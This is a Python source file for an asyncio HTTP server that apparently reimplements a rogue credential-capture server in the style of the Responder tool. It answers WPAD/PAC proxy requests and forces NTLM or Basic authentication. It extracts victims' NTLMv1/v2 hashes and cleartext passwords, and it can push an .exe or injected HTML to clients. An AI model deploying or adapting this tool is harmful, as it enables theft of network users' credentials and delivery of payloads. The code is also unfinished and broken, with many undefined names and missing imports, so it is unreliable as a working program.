import asyncio
import sys

####self.soc.settimeout(1) ???????

class HTTP_Proto(asyncio.Protocol):
        
        def __init__(self, _httptemplate):
                self._httptemplate = _httptemplate
                self._buffer_maxsize = 10*1024
                self._request_data_size = self._buffer_maxsize
                self._transport = None
                self._buffer = ''


        def connection_made(self, transport):
                print('New connection!' + str(transport))
                self._transport = transport

        def data_received(self, raw_data):
                try:
                        data = raw_data.decode('utf-8')
                except UnicodeDecodeError as e:
                        self._transport._write(str(e).encode('utf-8'))
                
                else:
                        self._buffer += data
                        self._parsebuff()

        def connection_lost(self, exc):
                print('Connection lost! ' + str(exc))

        def _parsebuff(self):
                if len(self._buffer) >= self._buffer_maxsize:
                        raise Exception('Input data too large!')

                if self._request_data_size == len(self._buffer):
                        #we have recieved all data for the request, and the request contained body data
                        self._parsereq()
                
                if self._buffer.find('\r\n\r\n') != -1: 
                        #we did, now to check if there was anything else in the request besides the header
                        if self._buffer.find('Content-Length') == -1:
                                #request contains only header
                                self._parsereq()
                        
                        else:
                                #searching for that content-length field in the header
                                for line in self._buffer.split('\r\n'):
                                        if line.find('Content-Length') != -1:
                                                line = line.strip()
                                                self._request_data_size = int(line.split(':')[1].strip()) - len(self._buffer)
                
        def _parsereq(self):
                _httpreq = HTTPReq()
                _httpreq.parse(self._buffer)
                print(str(_httpreq))
                
                #self.log(logging.INFO,str(req))
                #we should be dispatching the request object to the httptemplate now
                self._httptemplate.handle(_httpreq, self._transport)

class HTTPAuthorization():
        def __init__(self):
                self.type = ''
                self.data = ''

        def parse(self, t):
                marker = t.find(' ')
                if marker == -1:
                        raise Exception('Header parsing error!' + repr(line))

                self.type = t[:marker]
                self.data = t[marker+1:]


class HTTPReq():
        """
        HEADER KEYS ARE ALL LOWER CASE!!!
        """
        def __init__(self):
                self.rawdata = ''
                self.method = ''
                self.uri = ''
                self.version = ''
                self.headers = {}
                self.data = None

                self.authorization = None

                self.isWebDAV = False
                self.isFirefox = False

        def parse(self, data):
                self.rawdata = data
                header, self.data = self.rawdata.split('\r\n\r\n')

                request = ''
                first = True
                for line in header.split('\r\n'):
                        if first:
                                request = line
                                first = False
                                continue

                        marker = line.find(':')
                        if marker == -1:
                                raise Exception('Header parsing error!' + repr(line))
                        
                        self.headers[line[:marker].strip().lower()] = line[marker+1:].strip()

                self.method, self.uri, self.version = request.split(' ')

                if self.method == 'PROPFIND':
                        self.isWebDAV = True

                if 'user-agent' in self.headers:
                        if self.headers['user-agent'].find('Firefox') != -1:
                                self.isFirefox = True

                if 'authorization' in self.headers:
                        self.authorization = HTTPAuthorization()
                        self.authorization.parse(self.headers['authorization'])

        def __str__(self):
                return '[Request] Method: %s , URL: %s, Version: %s' % (self.method, self.uri, self.version)

class HTTPServer:

        def __init__(self, port, loop):
                self._port = port
                self._loop = loop
                self._username_transports = {}
                self.challenge = self.RandomChallenge()

        def run(self):
                coro = self._loop.create_server(
                                                        protocol_factory=lambda: HTTP_Proto(self),
                                                        host="",
                                                        port=self._port
                )

                return self._loop.run_until_complete(coro)

        def handle(self, request, transport):
                
                try:
                        if request.isFirefox:
                                self.log(logging.INFO,"[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.")
                                self.log(logging.INFO,"[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)")

                        Buffer = self.WpadCustom(request)
                        
                        if Buffer and self.settings['Force_WPAD_Auth'] == False:
                                transport.write(Buffer)
                                self.log(logging.ERROR, '[HTTP] WPAD (no auth) file sent to %s' % self.soc.getpeername()[0])
                        else:
                                Buffer, cont = self.PacketSequence(request)
                                self.log(logging.INFO,"PS returned %s" % repr(cont))
                                transport.write(Buffer)
                                if not cont:
                                        return
                
                except Exception as e:
                        self.log(logging.INFO,'Exception! %s' % (str(e),))
                        traceback.print_exc()
                        return

        def RandomChallenge(self):
                if self.settings['NumChal'] == "random":
                        from random import getrandbits
                        NumChal = '%016x' % getrandbits(16 * 4)
                        Challenge = b''
                        for i in range(0, len(NumChal),2):
                                Challenge += bytes.fromhex(NumChal[i:i+2])
                        return Challenge
                else:
                        return bytes.fromhex(self.settings['Challenge'])

        def WpadCustom(self, request):
                Wpad = re.search(r'(/wpad.dat|/*\.pac)', request.rawdata)
                if Wpad and request.isFirefox:
                        Buffer = WPADScript(Payload=b"function FindProxyForURL(url, host){return 'DIRECT';}")
                        Buffer.calculate()
                        return Buffer.getdata()

                if Wpad and not request.isFirefox:
                        Buffer = WPADScript(Payload=settings.Config.WPAD_Script.encode('ascii'))
                        Buffer.calculate()
                        return Buffer.getdata()
                return False
        
        
        # Handle HTTP packet sequence.
        def PacketSequence(self, request):
                # Serve the .exe if needed
                if self.settings['Serve_Always'] is True or (self.settings['Serve_Exe'] is True and re.findall('.exe', data)):
                        return self.RespondWithFile(self.settings['Exe_Filename'], self.settings['Exe_DlName']), True

                # Serve the custom HTML if needed
                if self.settings['Serve_Html']:
                        return self.RespondWithFile(self.settings['Html_Filename']), True

                WPAD_Custom = self.WpadCustom(request)
                # Webdav
                if request.method == 'OPTIONS':
                        Buffer = WEBDAV_Options_Answer()
                        return Buffer.getdata(), True

                if request.authorization is not None:
                        if request.authorization.type == 'NTLM':

                        
                                Packet_NTLM = b64decode(''.join(request.authorization.data))[8:9]
                                self.log(logging.DEBUG,"Challenge 2: %s" % self.challenge.hex())
                                if Packet_NTLM == b"\x01":
                                        Buffer = NTLM_Challenge(ServerChallenge=self.challenge)
                                        Buffer.calculate()

                                        Buffer_Ans = IIS_NTLM_Challenge_Ans()
                                        Buffer_Ans.calculate(Buffer.getdata())
                                        return Buffer_Ans.getdata(), True

                                if Packet_NTLM == b"\x03":
                                        NTLM_Auth = b64decode(''.join(request.authorization.data))
                                        if request.isWebDAV:
                                                module = "WebDAV"
                                        else:
                                                module = "HTTP"
                                        self.ParseHTTPHash(NTLM_Auth, module)

                                if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
                                        self.log(logging.INFO, '[HTTP] WPAD (auth) file sent to %s' %  self.soc.getpeername()[0]) 
                                        return WPAD_Custom, True
                                else:
                                        Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
                                        Buffer.calculate()
                                        return Buffer.getdata(), False

                        elif request.authorization.type == 'Basic':
                                ClearText_Auth = b64decode(''.join(request.authorization.data))
                                #log http req?

                                self.logResult({
                                        'module': 'HTTP', 
                                        'type': 'Basic', 
                                        'client': self.soc.getpeername()[0], 
                                        'user': ClearText_Auth.split(':')[0], 
                                        'cleartext': ClearText_Auth.split(':')[1], 
                                })

                                if self.settings['Force_WPAD_Auth'] and WPAD_Custom:
                                        self.log(logging.INFO, '[HTTP] WPAD (auth) file sent to %s' %  self.soc.getpeername()[0]) 
                                        return WPAD_Custom, True
                                else:
                                        Buffer = IIS_Auth_Granted(Payload=self.settings['HtmlToInject'].encode())
                                        Buffer.calculate()
                                        return Buffer.getdata(), False
                else:
                        if self.settings['Basic']:
                                Response = IIS_Basic_401_Ans()
                                self.log(logging.INFO, '[HTTP] Sending BASIC authentication request to %s' %  self.soc.getpeername()[0]) 

                        else:
                                Response = IIS_Auth_401_Ans()
                                self.log(logging.INFO, '[HTTP] Sending NTLM authentication request to %s' %  self.soc.getpeername()[0]) 

                        return Response.getdata(), True

        def RespondWithFile(self, filename, dlname=None):
                
                if filename.endswith('.exe'):
                        Buffer = ServeExeFile(Payload = ServeFile(filename), ContentDiFile=dlname)
                else:
                        Buffer = ServeHtmlFile(Payload = ServeFile(filename))

                Buffer.calculate()
                self.log(logging.INFO, "[HTTP] Sending file %s to %s" % (filename, self.client))
                return Buffer.getdata()

        
        # Parse NTLMv1/v2 hash.
        #data, Challenge, client, module
        def ParseHTTPHash(self, data, module):
                LMhashLen    = struct.unpack('<H',data[12:14])[0]
                LMhashOffset = struct.unpack('<H',data[16:18])[0]
                LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen].hex().upper()
                
                NthashLen    = struct.unpack('<H',data[20:22])[0]
                NthashOffset = struct.unpack('<H',data[24:26])[0]
                NTHash       = data[NthashOffset:NthashOffset+NthashLen].hex().upper()
                
                UserLen      = struct.unpack('<H',data[36:38])[0]
                UserOffset   = struct.unpack('<H',data[40:42])[0]
                User         = data[UserOffset:UserOffset+UserLen].replace(b'\x00',b'').decode()

                if NthashLen == 24:
                        HostNameLen     = struct.unpack('<H',data[46:48])[0]
                        HostNameOffset  = struct.unpack('<H',data[48:50])[0]
                        HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
                        WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, self.challenge.hex())
                        self.logResult({
                                'module': module, 
                                'type': 'NTLMv1', 
                                'client': self.soc.getpeername()[0], 
                                'host': HostName, 
                                'user': User, 
                                'hash': LMHash+":"+NTHash, 
                                'fullhash': WriteHash,
                        })

                if NthashLen > 24:
                        NthashLen      = 64
                        DomainLen      = struct.unpack('<H',data[28:30])[0]
                        DomainOffset   = struct.unpack('<H',data[32:34])[0]
                        Domain         = data[DomainOffset:DomainOffset+DomainLen].replace(b'\x00',b'').decode()
                        HostNameLen    = struct.unpack('<H',data[44:46])[0]
                        HostNameOffset = struct.unpack('<H',data[48:50])[0]
                        HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace(b'\x00',b'').decode()
                        WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, self.challenge.hex(), NTHash[:32], NTHash[32:])
                         
                        self.logResult({
                                'module': module, 
                                'type': 'NTLMv2', 
                                'client': self.soc.getpeername()[0], 
                                'host': HostName, 
                                'user': Domain + '\\' + User,
                                'hash': NTHash[:32] + ":" + NTHash[32:],
                                'fullhash': WriteHash,
                        })


def main(argv):
        port = 80
        loop = asyncio.get_event_loop()
        httpserer = HTTPServer(port, loop)
        server = httpserer.run()
        loop.run_forever()

if __name__ == "__main__":
        main(sys.argv)